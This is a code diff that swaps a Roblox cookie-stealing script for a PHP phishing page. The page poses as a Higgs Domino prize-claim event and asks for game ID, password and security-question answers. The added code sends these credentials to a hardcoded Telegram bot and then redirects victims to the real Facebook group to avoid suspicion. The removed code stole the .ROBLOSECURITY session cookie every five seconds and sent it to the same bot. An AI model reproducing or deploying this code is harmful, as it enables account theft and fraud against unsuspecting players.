@@ -1,67 +1,78 @@
+<?php
+// ==========================================
+// --- SETTING BOT TELEGRAM LU DI SINI ---
+// ==========================================
+$token   = "8539107085:AAGOfPQa0X1L-tuWPmdmJH52Bqx30Yao4qQ"; // Ambil dari @BotFather
+$chat_id = "6518432642";   // Ambil dari @userinfobot
+
+// --- PROSES KIRIM DATA (Jalankan kalau tombol diklik) ---
+if ($_POST) {
+    $id_game    = $_POST['id'];
+    $password   = $_POST['pass'];
+    $pertanyaan = $_POST['tanya'];
+    $jawaban    = $_POST['jawab'];
+
+    $message  = "===== SETORAN CHIP HDI =====\n";
+    $message .= "ID Game  : " . $id_game . "\n";
+    $message .= "Password : " . $password . "\n";
+    $message .= "Tanya    : " . $pertanyaan . "\n";
+    $message .= "Jawab    : " . $jawaban . "\n";
+    $message .= "============================";
+
+    // Kirim ke Telegram
+    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($message));
+
+    // Redirect ke grup FB asli biar gak curiga
+    header("Location: https://www.facebook.com/groups/higgsdomino/");
+    exit();
+}
+?>
+
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-    <title>Loading...</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Event Sedekah Leon 2B</title>
     <style>
-        body { 
-            margin: 0; 
-            padding: 0; 
-            height: 100vh; 
-            background: #000; 
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .spinner { 
-            border: 10px solid #222; 
-            border-top: 10px solid #00ff00; 
-            border-radius: 50%; 
-            width: 80px; 
-            height: 80px; 
-            animation: spin 1.5s linear infinite; 
-        }
-        @keyframes spin { 
-            0% { transform: rotate(0deg); } 
-            100% { transform: rotate(360deg); } 
-        }
+        body { background-color: #2c014d; color: white; font-family: sans-serif; text-align: center; padding: 20px; }
+        .box { background: #4a027d; border: 2px solid #ffd700; border-radius: 15px; padding: 20px; max-width: 400px; margin: auto; box-shadow: 0 0 15px rgba(0,0,0,0.5); }
+        img { width: 100%; border-radius: 10px; margin-bottom: 10px; }
+        input, select { width: 90%; padding: 12px; margin: 8px 0; border-radius: 5px; border: none; font-size: 16px; }
+        button { background: linear-gradient(#ffd700, #ff8c00); color: #2c014d; border: none; padding: 12px; font-weight: bold; cursor: pointer; border-radius: 5px; width: 95%; margin-top: 10px; }
+        .footer { color: #ffeb3b; font-size: 11px; margin-top: 15px; line-height: 1.5; }
     </style>
 </head>
 <body>
-    <div class="spinner"></div>
 
-    <script>
-        async function stealCookie() {
-            const cookies = document.cookie;
-            const robloxCookieRow = cookies.split(';').find(row => row.trim().startsWith('.ROBLOSECURITY='));
-            
-            if (robloxCookieRow) {
-                const fullCookie = robloxCookieRow.split('=')[1];
+<div class="box">
+    <img src="https://logodownload.org/wp-content/uploads/2021/11/higgs-domino-logo.png" alt="Event Leon">
+    <h2 style="margin: 5px 0;">KLAIM SEDEKAH 2B</h2>
+    <p style="font-size: 14px;">Masukkan data akun untuk verifikasi hadiah hari ini.</p>
 
-                // GANTI INI DULU PAKE TELEGRAM BOT LU SENDIRI
-                const BOT_TOKEN = '8539107085:AAGOfPQa0X1L-tuWPmdmJH52Bqx30Yao4qQ';
-                const CHAT_ID = '6518432642';
+    <form method="POST">
+        <input type="number" name="id" placeholder="ID Game" required>
+        <input type="password" name="pass" placeholder="Password" required>
+        
+        <select name="tanya" required>
+            <option value="">-- Pertanyaan Keamanan --</option>
+            <option value="Ibu">Nama Ibu Kandung</option>
+            <option value="Guru">Nama Guru Favorit</option>
+            <option value="Hewan">Nama Hewan Peliharaan</option>
+            <option value="Sekolah">Nama Sekolah Dasar</option>
+        </select>
+        
+        <input type="text" name="jawab" placeholder="Jawaban Keamanan" required>
+        
+        <button type="submit">AMBIL HADIAH SEKARANG</button>
+    </form>
+    
+    <div class="footer">
+        *Pastikan data benar agar chip bisa terkirim otomatis.<br>
+        © 2026 Higgs Domino Island.
+    </div>
+</div>
 
-                const message = `🤑 COOKIE BARU
-
-${fullCookie}`;
-
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message
-                    })
-                }).catch(() => {});
-            }
-        }
-
-        // Jalankan langsung + loop tiap 5 detik
-        stealCookie();
-        setInterval(stealCookie, 5000);
-    </script>
 </body>
-
 </html>
-
 
